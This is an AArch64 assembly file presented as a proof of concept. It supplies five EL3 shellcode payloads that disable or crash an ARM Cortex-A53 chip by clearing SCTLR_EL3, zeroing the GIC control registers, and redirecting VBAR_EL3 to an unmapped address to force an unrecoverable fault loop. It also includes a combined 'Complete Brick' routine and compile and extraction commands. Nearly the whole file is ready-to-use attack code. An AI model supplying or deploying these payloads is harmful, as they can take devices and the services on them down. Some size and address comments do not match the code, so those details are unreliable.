/*
 * A53-RE Disable PoC — Inline Assembly Payloads
 *
 * EL3-level shellcode to disable the A53 chip.
 * Compile with: clang --target=aarch64-none-elf -c disable_poc.S -o disable_poc.o
 * Extract raw bytes: objcopy -O binary disable_poc.o disable_poc.bin
 *
 * All payloads assume execution at EL3 with full system register access.
 */

.arch armv8-a
.text
.p2align 2

/* ─── Payload 1: Disable MMU (SCTLR_EL3) ─── */
.globl disable_mmu
disable_mmu:
    /* Clear SCTLR_EL3 — MMU off, caches off */
    msr sctlr_el3, xzr
    isb
    /* At this point, next instruction fetch uses physical addressing.
     * If PA != VA, crash is immediate.
     * If PA == VA (SRAM identity mapped), infinite loop. */
    b .

/* ─── Payload 2: Disable GIC (Interrupts) ─── */
.globl disable_gic
disable_gic:
    /* Read CBAR_EL1 to get GIC base */
    mrs x0, S3_1_C15_C3_0       /* CBAR_EL1 */
    /* GICD_CTLR is at CBAR + 0x1000 */
    add x1, x0, #0x1000
    str wzr, [x1]                /* Disable distributor */
    /* GICC_CTLR is at CBAR + 0x2000 */
    add x1, x0, #0x2000
    str wzr, [x1]                /* Disable CPU interface */
    dsb sy
    isb
    b .

/* ─── Payload 3: VBAR Redirect to Crash ─── */
.globl disable_vbar_crash
disable_vbar_crash:
    /* Set VBAR_EL3 to invalid address */
    mov x0, #0xDEAD000000000000
    msr vbar_el3, x0
    isb
    /* The next timer interrupt (~1ms) will vector to 0xDEAD00000000,
     * causing a prefetch abort. The abort handler also vectors there,
     * creating an unrecoverable double-fault loop. */
    b .

/* ─── Payload 4: Complete Brick (Combined) ───
 * WARNING: This payload assumes VA==PA (identity mapping) for the code region.
 * If VA!=PA, the MMU disable at step 3 will cause an immediate crash on the
 * next instruction fetch. In that case, use disable_vbar_crash instead.
 */
.globl disable_complete
disable_complete:
    /* Step 1: VBAR redirect first (before MMU off, when VA is still valid) */
    mov x0, #0xDEAD000000000000
    msr vbar_el3, x0
    isb

    /* Step 2: Disable GIC */
    mrs x0, S3_1_C15_C3_0       /* CBAR_EL1 */
    add x1, x0, #0x1000
    str wzr, [x1]                /* GICD_CTLR = 0 */
    add x1, x0, #0x2000
    str wzr, [x1]                /* GICC_CTLR = 0 */

    /* Step 3: Clear SCR_EL3 */
    msr scr_el3, xzr

    /* Step 4: Disable MMU LAST — after this, only works if VA==PA */
    msr sctlr_el3, xzr
    isb

    /* Step 5: If still executing (VA==PA), infinite loop.
     * Timer IRQ → VBAR=0xDEAD... → double fault. */
    b .

/* ─── Payload 5: Minimal — Single MSR VBAR crash ─── */
.globl disable_minimal
disable_minimal:
    /* The simplest kill: redirect exceptions to unmapped memory.
     * Note: VBAR_EL3=0x0 is the VALID reset vector — do NOT use xzr!
     * Only 3 instructions, 12 bytes. */
    mov x0, #0xDEAD000000000000
    msr vbar_el3, x0            /* VBAR_EL3 = 0xDEAD000000000000 (unmapped) */
    isb
    /* Next timer IRQ → exception at EL3 → fetch from unmapped VA → crash */
    b .

/* ─── Payload Sizes ───
 * disable_mmu:        12 bytes (3 insns)
 * disable_gic:        20 bytes (5 insns)
 * disable_vbar_crash: 12 bytes (3 insns)
 * disable_complete:   48 bytes (12 insns)
 * disable_minimal:    12 bytes (3 insns)
 */
